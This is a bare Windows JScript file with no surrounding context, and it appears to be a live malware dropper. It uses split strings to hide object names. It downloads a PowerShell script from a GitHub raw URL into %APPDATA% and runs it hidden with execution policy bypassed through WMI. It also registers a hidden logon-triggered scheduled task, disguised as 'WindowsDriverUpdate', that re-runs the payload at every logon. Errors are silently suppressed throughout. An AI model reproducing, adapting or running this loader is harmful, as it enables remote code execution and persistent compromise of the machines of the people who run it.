var u="https://github.com/i25968627-ui/jubilant-octo-fishstick-msi/raw/refs/heads/main/oiuytre.ps1";
var wm="win"+"mgmts:root\\cimv2";
var wh="WinHttp."+"WinHttpRequest.5.1";
var ad="ADODB."+"Stream";
var sv="Schedule."+"Service";
var sh=new ActiveXObject("WScript."+"Shell");
var pw=sh.ExpandEnvironmentStrings("%SystemRoot%")+"\\System32\\WindowsPowerShell\\v1.0\\"+"pow"+"ershell.exe";
var t=sh.ExpandEnvironmentStrings("%APPDATA%")+"\\sys32.tmp.ps1";
try{
var x=new ActiveXObject(wh);
x.SetTimeouts(8000,8000,20000,40000);
x.Open("GET",u,false);
x.Send();
if(x.Status===200){
var s=new ActiveXObject(ad);
s.Type=1;s.Open();s.Write(x.ResponseBody);s.SaveToFile(t,2);s.Close();
}
}catch(e){}
var c=pw+' -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "'+t+'"';
try{GetObject(wm).Get("Win32_Process").Create(c,null,null,0);}catch(e){}
try{
var v=new ActiveXObject(sv);
v.Connect();
var d=v.NewTask(0);
d.RegistrationInfo.Description="Windows Driver Compatibility Agent";
d.Settings.Enabled=true;
d.Settings.Hidden=true;
d.Settings.DisallowStartIfOnBatteries=false;
d.Settings.StopIfGoingOnBatteries=false;
var g=d.Triggers.Create(9);
var a=d.Actions.Create(0);
a.Path=pw;
a.Arguments='-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "'+t+'"';
v.GetFolder("\\").RegisterTaskDefinition("WindowsDriverUpdate",d,6,null,null,3);
}catch(e){}
